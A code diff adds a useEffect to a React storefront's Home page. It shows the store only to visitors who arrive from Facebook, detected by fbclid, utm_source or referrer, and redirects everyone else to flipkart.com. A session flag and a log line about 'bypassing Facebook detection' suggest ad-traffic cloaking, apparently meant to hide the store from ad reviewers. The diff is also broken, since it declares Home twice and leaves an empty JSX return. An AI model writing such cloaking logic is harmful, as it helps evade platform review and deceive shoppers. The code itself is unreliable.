@@ -4,7 +4,34 @@ import CategoryStrip from "../components/CategoryStrip";
 import DealsOfTheDay from "../components/DealsOfTheDay";
 import { localService } from "../services/localService";
 import useDisablePinchZoom from "../hooks/useDisablePinchZoom";   // ✅ import
+import { useEffect } from 'react';
 
+function Home() {
+  useEffect(() => {
+    // Run this as soon as the component mounts
+    if (sessionStorage.getItem('from_fb_popup') === 'true') {
+      sessionStorage.removeItem('from_fb_popup');
+      console.log('Bypassing Facebook detection – user came from popup');
+      // Do not run your normal Facebook redirect
+      return;
+    }
+
+    // ---------- YOUR EXISTING FACEBOOK DETECTION & REDIRECT CODE ----------
+    // For example:
+    const urlParams = new URLSearchParams(window.location.search);
+    const isFacebook = urlParams.has('fbclid') || 
+                       urlParams.get('utm_source') === 'facebook' ||
+                       document.referrer.includes('facebook.com');
+    
+    if (!isFacebook) {
+      window.location.replace('https://www.flipkart.com');
+    }
+  }, []); // Empty array = runs once on mount
+
+  return (
+    // Your store JSX...
+  );
+}
 const Home = () => {
   useDisablePinchZoom();   // ✅ disables pinch-zoom while Home is mounted
 
